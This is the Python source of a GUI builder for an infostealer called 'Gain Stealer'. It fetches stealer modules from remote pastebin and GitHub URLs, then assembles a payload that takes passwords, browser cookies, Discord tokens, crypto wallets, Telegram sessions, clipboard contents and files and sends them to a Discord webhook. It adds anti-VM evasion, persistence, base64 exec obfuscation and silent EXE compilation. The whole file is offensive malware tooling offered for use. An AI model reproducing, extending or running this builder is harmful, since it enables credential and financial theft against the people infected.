import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox, filedialog
import os
import json
import tempfile
import base64
import requests
import subprocess
import sys
import threading
from datetime import datetime

class ModularGainBuilder:
    def __init__(self, root):
        self.root = root
        self.root.title("Gain Stealer Modular Builder v6.0")
        self.root.geometry("1000x700")
        
        self.raw_urls = {
            'imports': 'https://pastebin.com/raw/IMPORTS_CODE',
            'config': 'https://github.com/exsarorrayzer/gain-stealer/blob/main/raw/config.py',
            'anti_analysis': 'https://raw.githubusercontent.com/exsarorrayzer/gain-stealer/refs/heads/main/raw/anti_analysis.py',
            'password_stealer': 'https://pastebin.com/raw/PASSWORD_STEALER',
            'cookie_stealer': 'https://raw.githubusercontent.com/exsarorrayzer/gain-stealer/refs/heads/main/raw/cookie_stealer.py',
            'token_stealer': 'https://pastebin.com/raw/TOKEN_STEALER',
            'wallet_stealer': 'https://pastebin.com/raw/WALLET_STEALER',
            'system_info': 'https://pastebin.com/raw/SYSTEM_INFO',
            'clipboard': 'https://raw.githubusercontent.com/exsarorrayzer/gain-stealer/refs/heads/main/raw/clipboard.py',
            'telegram': 'https://pastebin.com/raw/TELEGRAM',
            'file_grabber': 'https://raw.githubusercontent.com/exsarorrayzer/gain-stealer/refs/heads/main/raw/file_grabber.py',
            'data_handler': 'https://raw.githubusercontent.com/exsarorrayzer/gain-stealer/refs/heads/main/raw/data_handler.py',
            'main': 'https://pastebin.com/raw/MAIN_CODE'
        }
        
        # Değişkenler
        self.webhook_var = tk.StringVar(value="https://discord.com/api/webhooks/YOUR_WEBHOOK")
        self.output_var = tk.StringVar(value="gain")
        
        # Özellik seçenekleri
        self.features = {
            'passwords': tk.BooleanVar(value=True),
            'cookies': tk.BooleanVar(value=True),
            'tokens': tk.BooleanVar(value=True),
            'wallets': tk.BooleanVar(value=True),
            'files': tk.BooleanVar(value=True),
            'clipboard': tk.BooleanVar(value=True),
            'system_info': tk.BooleanVar(value=True),
            'telegram': tk.BooleanVar(value=False)
        }
        
        # Obfuscation
        self.obfuscation = {
            'remove_comments': tk.BooleanVar(value=True),
            'base64_encode': tk.BooleanVar(value=True),
            'add_junk': tk.BooleanVar(value=False)
        }
        
        # Anti-analysis
        self.anti_analysis = {
            'anti_vm': tk.BooleanVar(value=True),
            'startup_delay': tk.BooleanVar(value=True),
            'delay_seconds': tk.IntVar(value=30),
            'mutex': tk.BooleanVar(value=True),
            'persist': tk.BooleanVar(value=True)
        }
        
        self.compile_exe = tk.BooleanVar(value=True)
        
        self.setup_ui()
    
    def setup_ui(self):
        notebook = ttk.Notebook(self.root)
        notebook.pack(fill='both', expand=True, padx=10, pady=10)
        
        # Sekmeler
        tabs = ['main', 'features', 'obfuscation', 'anti_analysis', 'build']
        
        for tab in tabs:
            frame = ttk.Frame(notebook)
            notebook.add(frame, text=tab.title())
            
            if tab == 'main':
                self.setup_main_tab(frame)
            elif tab == 'features':
                self.setup_features_tab(frame)
            elif tab == 'obfuscation':
                self.setup_obfuscation_tab(frame)
            elif tab == 'anti_analysis':
                self.setup_anti_analysis_tab(frame)
            elif tab == 'build':
                self.setup_build_tab(frame)
    
    def setup_main_tab(self, parent):
        frame = ttk.Frame(parent, padding="20")
        frame.pack(fill='both', expand=True)
        
        ttk.Label(frame, text="Gain Stealer Modular Builder", 
                 font=("Arial", 16, "bold")).pack(pady=(0, 20))
        
        # Webhook
        webhook_frame = ttk.Frame(frame)
        webhook_frame.pack(fill='x', pady=10)
        ttk.Label(webhook_frame, text="Discord Webhook:", width=15).pack(side='left')
        ttk.Entry(webhook_frame, textvariable=self.webhook_var, width=70).pack(side='left', padx=5)
        
        # Output
        output_frame = ttk.Frame(frame)
        output_frame.pack(fill='x', pady=10)
        ttk.Label(output_frame, text="Output Name:", width=15).pack(side='left')
        ttk.Entry(output_frame, textvariable=self.output_var, width=30).pack(side='left', padx=5)
        
        # Raw URLs edit
        ttk.Separator(frame).pack(fill='x', pady=20)
        ttk.Label(frame, text="Raw URLs Configuration", 
                 font=("Arial", 12, "bold")).pack(anchor='w', pady=(0, 10))
        
        self.urls_text = scrolledtext.ScrolledText(frame, height=10, width=80)
        self.urls_text.pack(fill='both', expand=True, pady=10)
        
        # Load default URLs
        urls_text = json.dumps(self.raw_urls, indent=2)
        self.urls_text.insert('1.0', urls_text)
        
        # Update button
        ttk.Button(frame, text="Update URLs", 
                  command=self.update_urls, width=20).pack(pady=10)
    
    def setup_features_tab(self, parent):
        frame = ttk.Frame(parent, padding="20")
        frame.pack(fill='both', expand=True)
        
        ttk.Label(frame, text="Stealer Features", 
                 font=("Arial", 14, "bold")).pack(anchor='w', pady=(0, 15))
        
        features_list = [
            ("🔑 Passwords Stealer", 'passwords'),
            ("🍪 Cookies Stealer", 'cookies'),
            ("👤 Discord Tokens", 'tokens'),
            ("💰 Crypto Wallets", 'wallets'),
            ("📁 File Grabber", 'files'),
            ("📋 Clipboard Monitor", 'clipboard'),
            ("💻 System Information", 'system_info'),
            ("✈️ Telegram Sessions", 'telegram')
        ]
        
        for text, key in features_list:
            ttk.Checkbutton(frame, text=text, 
                           variable=self.features[key]).pack(anchor='w', pady=5)
    
    def setup_obfuscation_tab(self, parent):
        frame = ttk.Frame(parent, padding="20")
        frame.pack(fill='both', expand=True)
        
        ttk.Label(frame, text="Code Obfuscation", 
                 font=("Arial", 14, "bold")).pack(anchor='w', pady=(0, 15))
        
        ttk.Checkbutton(frame, text="Remove Comments", 
                       variable=self.obfuscation['remove_comments']).pack(anchor='w', pady=5)
        ttk.Checkbutton(frame, text="Base64 Encode Main Code", 
                       variable=self.obfuscation['base64_encode']).pack(anchor='w', pady=5)
        ttk.Checkbutton(frame, text="Add Junk Code", 
                       variable=self.obfuscation['add_junk']).pack(anchor='w', pady=5)
        ttk.Checkbutton(frame, text="Compile to EXE", 
                       variable=self.compile_exe).pack(anchor='w', pady=20)
    
    def setup_anti_analysis_tab(self, parent):
        frame = ttk.Frame(parent, padding="20")
        frame.pack(fill='both', expand=True)
        
        ttk.Label(frame, text="Anti-Analysis Features", 
                 font=("Arial", 14, "bold")).pack(anchor='w', pady=(0, 15))
        
        ttk.Checkbutton(frame, text="Anti-VM Detection", 
                       variable=self.anti_analysis['anti_vm']).pack(anchor='w', pady=5)
        ttk.Checkbutton(frame, text="Mutex Check (Single Instance)", 
                       variable=self.anti_analysis['mutex']).pack(anchor='w', pady=5)
        ttk.Checkbutton(frame, text="Persistence (Startup)", 
                       variable=self.anti_analysis['persist']).pack(anchor='w', pady=5)
        
        ttk.Checkbutton(frame, text="Startup Delay", 
                       variable=self.anti_analysis['startup_delay']).pack(anchor='w', pady=10)
        
        delay_frame = ttk.Frame(frame)
        delay_frame.pack(fill='x', pady=5)
        ttk.Label(delay_frame, text="Delay seconds:").pack(side='left')
        ttk.Spinbox(delay_frame, from_=5, to=300, 
                   textvariable=self.anti_analysis['delay_seconds'], 
                   width=10).pack(side='left', padx=10)
    
    def setup_build_tab(self, parent):
        frame = ttk.Frame(parent, padding="20")
        frame.pack(fill='both', expand=True)
        
        ttk.Label(frame, text="Build & Compile", 
                 font=("Arial", 14, "bold")).pack(anchor='w', pady=(0, 15))
        
        self.log_text = scrolledtext.ScrolledText(frame, height=15, font=("Consolas", 9))
        self.log_text.pack(fill='both', expand=True, pady=10)
        
        btn_frame = ttk.Frame(frame)
        btn_frame.pack()
        
        ttk.Button(btn_frame, text="Download Modules", 
                  command=self.download_modules, width=20).pack(side='left', padx=5)
        ttk.Button(btn_frame, text="Build Python Script", 
                  command=lambda: self.build_stealer(compile_exe=False), 
                  width=20).pack(side='left', padx=5)
        ttk.Button(btn_frame, text="Build EXE", 
                  command=lambda: self.build_stealer(compile_exe=True), 
                  width=20).pack(side='left', padx=5)
    
    def update_urls(self):
        try:
            urls_text = self.urls_text.get('1.0', tk.END).strip()
            self.raw_urls = json.loads(urls_text)
            self.log("URLs updated successfully")
        except Exception as e:
            self.log(f"Error updating URLs: {str(e)}")
    
    def log(self, message):
        timestamp = datetime.now().strftime("%H:%M:%S")
        self.log_text.insert(tk.END, f"[{timestamp}] {message}\n")
        self.log_text.see(tk.END)
        self.root.update()
    
    def download_modules(self):
        self.log("Downloading modules from raw URLs...")
        
        self.modules = {}
        
        for module_name, url in self.raw_urls.items():
            try:
                response = requests.get(url, timeout=10)
                if response.status_code == 200:
                    self.modules[module_name] = response.text
                    self.log(f"✓ Downloaded: {module_name}")
                else:
                    self.log(f"✗ Failed: {module_name} (HTTP {response.status_code})")
            except Exception as e:
                self.log(f"✗ Error downloading {module_name}: {str(e)}")
        
        self.log(f"Downloaded {len(self.modules)}/{len(self.raw_urls)} modules")
    
    def build_stealer(self, compile_exe=True):
        if not hasattr(self, 'modules') or not self.modules:
            self.log("Error: Modules not downloaded. Click 'Download Modules' first.")
            return
        
        self.log("Building stealer code...")
        
        try:
            final_code = ""
            
            # 1. Imports
            if 'imports' in self.modules:
                final_code += self.modules['imports'] + "\n\n"
            
            # 2. Config
            if 'config' in self.modules:
                config_code = self.modules['config'].replace(
                    "{WEBHOOK_URL}", 
                    f'"{self.webhook_var.get()}"'
                )
                final_code += config_code + "\n\n"
            
            # 3. Anti-analysis (with conditions)
            if 'anti_analysis' in self.modules:
                anti_code = self.modules['anti_analysis']
                
                # Replace condition placeholders
                replacements = {
                    "{ANTI_VM}": str(self.anti_analysis['anti_vm'].get()).lower(),
                    "{STARTUP_DELAY}": str(self.anti_analysis['startup_delay'].get()).lower(),
                    "{DELAY_SECONDS}": str(self.anti_analysis['delay_seconds'].get()),
                    "{MUTEX}": str(self.anti_analysis['mutex'].get()).lower(),
                    "{PERSIST}": str(self.anti_analysis['persist'].get()).lower()
                }
                
                for placeholder, value in replacements.items():
                    anti_code = anti_code.replace(placeholder, value)
                
                final_code += anti_code + "\n\n"
            
            # 4. Feature modules (only if enabled)
            feature_modules = [
                ('password_stealer', 'passwords'),
                ('cookie_stealer', 'cookies'),
                ('token_stealer', 'tokens'),
                ('wallet_stealer', 'wallets'),
                ('system_info', 'system_info'),
                ('clipboard', 'clipboard'),
                ('telegram', 'telegram'),
                ('file_grabber', 'files')
            ]
            
            for module_name, feature_key in feature_modules:
                if module_name in self.modules and self.features[feature_key].get():
                    final_code += self.modules[module_name] + "\n\n"
            
            # 5. Data handler
            if 'data_handler' in self.modules:
                data_code = self.modules['data_handler']
                
                # Build conditions for each feature
                conditions = ""
                for module_name, feature_key in feature_modules:
                    if self.features[feature_key].get():
                        conditions += f"    if {str(self.features[feature_key].get()).lower()}:\n"
                        conditions += f"        data['{feature_key}'] = {feature_key.replace('_', '')}()\n"
                
                data_code = data_code.replace("{FEATURE_CONDITIONS}", conditions)
                final_code += data_code + "\n\n"
            
            # 6. Main code
            if 'main' in self.modules:
                final_code += self.modules['main'] + "\n\n"
            
            # Apply obfuscation
            if self.obfuscation['remove_comments'].get():
                final_code = self.remove_comments(final_code)
            
            if self.obfuscation['base64_encode'].get():
                final_code = self.base64_encode(final_code)
            
            if self.obfuscation['add_junk'].get():
                final_code = self.add_junk_code(final_code)
            
            # Save Python file
            output_name = self.output_var.get().strip() or "gain"
            py_filename = output_name + ".py"
            
            with open(py_filename, 'w', encoding='utf-8') as f:
                f.write(final_code)
            
            self.log(f"✓ Python script saved: {py_filename}")
            
            # Compile to EXE if requested
            if compile_exe and self.compile_exe.get():
                self.compile_to_exe(py_filename, output_name)
            
        except Exception as e:
            self.log(f"✗ Build error: {str(e)}")
            import traceback
            self.log(traceback.format_exc())
    
    def remove_comments(self, code):
        lines = code.split('\n')
        clean_lines = []
        for line in lines:
            if '#' in line:
                line = line.split('#')[0]
            if line.strip():
                clean_lines.append(line)
        return '\n'.join(clean_lines)
    
    def base64_encode(self, code):
        encoded = base64.b64encode(code.encode()).decode()
        wrapper = f'''
import base64
exec(base64.b64decode("{encoded}"))
'''
        return wrapper
    
    def add_junk_code(self, code):
        junk_lines = [
            '# ' + ''.join(random.choices(string.ascii_letters + string.digits, k=50)),
            'junk_var_' + str(random.randint(1000, 9999)) + ' = "' + ''.join(random.choices(string.ascii_letters, k=20)) + '"',
            'def junk_func_' + str(random.randint(1000, 9999)) + '(): pass'
        ]
        
        lines = code.split('\n')
        new_lines = []
        
        for line in lines:
            new_lines.append(line)
            if line.strip() and not line.strip().startswith('#') and random.random() > 0.7:
                new_lines.append(random.choice(junk_lines))
        
        return '\n'.join(new_lines)
    
    def compile_to_exe(self, py_filename, output_name):
        self.log("Compiling to EXE...")
        
        try:
            pyinstaller_cmd = [
                'pyinstaller',
                '--onefile',
                '--windowed',
                '--noconsole',
                f'--name={output_name}',
                '--hidden-import=win32timezone',
                '--hidden-import=win32crypt',
                '--hidden-import=Crypto.Cipher',
                '--hidden-import=browser_cookie3',
                py_filename
            ]
            
            self.log(f"Running: {' '.join(pyinstaller_cmd)}")
            
            result = subprocess.run(pyinstaller_cmd, 
                                  capture_output=True, 
                                  text=True, 
                                  shell=True)
            
            if result.returncode == 0:
                exe_path = os.path.join('dist', output_name + '.exe')
                if os.path.exists(exe_path):
                    self.log(f"✓ EXE built: {exe_path}")
                else:
                    self.log("✗ EXE not found")
            else:
                self.log(f"✗ PyInstaller error: {result.stderr}")
        
        except Exception as e:
            self.log(f"✗ Compilation error: {str(e)}")

if __name__ == "__main__":
    root = tk.Tk()
    app = ModularGainBuilder(root)
    root.mainloop()
